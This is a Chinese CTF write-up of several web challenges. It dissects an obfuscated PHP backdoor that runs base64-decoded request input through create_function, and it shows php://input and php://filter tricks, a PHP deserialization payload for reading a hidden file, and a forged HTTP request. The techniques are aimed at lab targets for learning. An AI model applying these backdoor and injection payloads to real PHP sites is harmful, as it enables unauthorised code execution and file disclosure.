# Raccoon Writeup

### PHP 后门分析

李大猫在他的 WordPress 博客里发现了被黑客植入的 PHP 后门，快帮他分析分析这个后门要怎么利用吧

```php
<?php 
	$z0 = $_REQUEST['sort'];
	$q1 = '';
	$c2 = "wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";
	$y3 = array(8,38,15,7,6,4,26,25,7,34,24,25,7);
	foreach($y3 as $h4){
		$q1.=$c2[$h4];  // q1 = base64_decode
	}
	$v5 = strrev("noi"."tcnuf"."_eta"."erc");  // create_function
	$j6 = $v5("",$q1($z0));  // j6 = create_function("",base64_decode(sort))
	$j6();	// j6() 是一个没有参数的匿名函数，
?>
```

create_function() 与 eval()  有同样的危险性，可以注入恶意代码。

```php
function fT($a) {
  echo "test".$a;
}

// 注入 $a = }phpinfo();/* 后：
function fT($a) {
  echo "test";}
  phpinfo();/*
}*/

create_function(args, code)  // The function arguments. The function code.
$j6() => function(args) {
	code
}
```

此题只需将 `}phpinfo();/*` 进行 base64 编码，再传进去就 OK 了

![1541723641637](C:\Users\LegnaVI\AppData\Roaming\Typora\typora-user-images\1541723641637.png)



### 抓包和改包

满足以下全部条件就能获得 flag

-   将 HTTP 请求方式修改为 POST
-   添加 HTTP 请求头“X-Give-Me-Flag”，值为 1
-   将包含浏览器标识的 HTTP 请求头的值修改为“Flag Browser 1.0”
-   将 Cookie 中“auth”的值修改为 117.29.42.247
-   POST 键名为“action”，值为“readflag”的数据

这题比较简单，直接用 Burp 改一下就 OK 了

```shell
POST / HTTP/1.1
Host: http01.web.raccoon.ml:8080
User-Agent: Flag Browser 1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: auth=117.29.42.247
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
X-Give-Me-Flag: 1
Content-Length: 15
Content-Type: application/x-www-form-urlencoded

action=readflag
```

满足以下全部条件就能获得 raccoon{da952ba50ee4eecf7ac79cf49ec6669e}	



### Javascript Tricks

nc 45.32.250.222 8082

```javascript
var net = require('net');

flag='fake_flag';

var server = net.createServer(
	function(socket) {
		socket.on('data', (data) => { 
			//m = data.toString().replace(/[\n\r]*$/, '');
			ok = true;
			arr = data.toString().split(' ');  // 空格作为分隔，创建数组
			arr = arr.map(Number);	// 全部转为数字
			if (arr.length != 5)    // arr长度为5
				ok = false;
			arr1 = arr.slice(0);    // 抽取从0开始的所有字符(就是复制arr给arr1)
			arr1.sort();  			
			// js sort比较特殊  10,5,40,25,1000,1 -> 1,10,1000,25,40,5
			for (var i=0; i<4; i++)  // 前后元素不能相同
				if (arr1[i+1] == arr1[i] || arr[i] < 0 || arr1[i+1] > 127)
					ok = false;
			arr2 = []
			for (var i=0; i<4; i++)
				arr2.push(arr1[i] + arr1[i+1]);
			val = 0;
			for (var i=0; i<4; i++)
				val = val * 0x100 + arr2[i];  // 0x100 = 256
			if (val != 0x23332333)  // 590553907
				ok = false;
			if (ok)
				socket.write(flag+'\n');
			else
				socket.write('nope\n');
		});
		//socket.write('Echo server\r\n');
		//socket.pipe(socket);
	}
);

HOST = '0.0.0.0'
PORT = 8082

server.listen(PORT, HOST); 
```

有人说这是一道密码学的题，我觉得很有道理，哈哈。

初步思路：把 data 暴力跑出来，再 nc 提交一下

```python
def check(a,b,c,d):
    arr = [a,b,c,d]
    val = 0
    for i in range(4):
        val = val * 256 + arr[i]
    if val == 590553907:  # 也可以不转十进制
        return True

N = 60
for i in range(N):
    for j in range(N):
        for k in range(N):
            for l in range(N):
                if check(i,j,k,l):
                    print(i,j,k,l)

# arr2 = [35 51 35 51]

N = 51
for i in range(N):
    for j in range(N):
        for k in range(N):
            for l in range(N):
                for m in range(N):
                    if i+j == 35 and j+k == 52 and k+l == 35 and l+m == 51:
                        print(i,j,k,l,m)
                        
"""
0 35 17 18 33
1 34 18 17 34
2 33 19 16 35
3 32 20 15 36
4 31 21 14 37
5 30 22 13 38
6 29 23 12 39
7 28 24 11 40
8 27 25 10 41
9 26 26 9 42
10 25 27 8 43
11 24 28 7 44
12 23 29 6 45
13 22 30 5 46
14 21 31 4 47
15 20 32 3 48
16 19 33 2 49
17 18 34 1 50
18 17 35 0 51
"""

# 懒得写sort规则了，直接按照 js sort 规则手工挑选一下 
# 可得最终的 data：15 20 32 3 48
```



### The user admin

```shell
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
```

这道题涉及到PHP的代码审计，PHP的伪协议，PHP的序列化，PHP魔术方法，涨了不少姿势，

趁着写 Writeup 把思路再梳理一下。[参考博客1](https://blog.csdn.net/csu_vc/article/details/78375203)  [参考博客2](https://blog.csdn.net/yh1013024906/article/details/81087939) 

乍一看，玄机只可能在 class.php 里面，现在就是寻找满足 if 的这个条件。

```php
file_get_contents(path,include_path,context,start,max_length)
// 把整个文件读入一个字符串中，后四个参数都是可选项
```

问题变为，怎么读取 $user 之后得到 "the user is admin"。

这里涉及到一个 PHP伪协议，`php://input`，可读取没有处理过的 POST 数据。[详细讲解](<https://blog.csdn.net/qq_27682041/article/details/73326435>)  [大佬讲解](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

```shell
http://120.78.187.100:8081/?user=php://input
# 再 post 一个 "the user is admin"
# 此时可以发现界面变成了 "hello admin!"
http://120.78.187.100:8081/?user=php://input&file=class.php
# 然后还是没卵用？？
```

再来了一个 PHP伪协议，`php://filter`，可用来读取base64编码后的源代码。

```shell
?user=php://input&file=php://filter/read=convert.base64-encode/resource=class.php
```

解码之后，得到 class.php 的源代码

```php
<?php
	class Read{//f1a9.php
		public $file;
		public function __toString(){
			if(isset($this->file)){
				echo file_get_contents($this->file);    
			}
			return "__toString was called!";
		}
	}
?>
// 注意到有个 __tostring()，这个方法可以理解为将这个类作为字符串执行时会自动执行的一个函数
```

看一下 index.php 源代码

```php
<?php
    $user = $_GET["user"];
    $file = $_GET["file"];
    $pass = $_GET["pass"];

    if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
        echo "hello admin!<br>";
        if(preg_match("/f1a9/",$file)){  // 直接过滤掉 fla9
            exit();
        }else{
            include($file); //class.php
            $pass = unserialize($pass);  // 反序列化再输出
            echo $pass;
        }
    }else{
        echo "you are not admin ! ";
    }
?>
// unserialize()
```

总结一下思路，flag 就隐藏在 f1a9.php 里面，但是无法直接读取 f1a9.php 内容(被preg_match过滤)，只能通过Read 这个类中 __tostring() 方法，而这个方法再创建对象时就会被调用。能作为输入接口的就只有 pass 了，pass 这里又会反序列化再输出，所以利用 echo $pass; 来创建对象就可以了。

创建序列化对象

```php
<?php
    class Read{
    	public $file;
	}

	$a = new Read();
	$a->file = "f1a9.php";
	$a = serialize($a);
	print_r($a);
?>
// O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}
```

最终执行

```shell
http://120.78.187.100:8081/?user=php://input&file=class.php&pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}

# 再 post 一个 "the user is admin"
```



### Easy waf



### 咕咕 shop

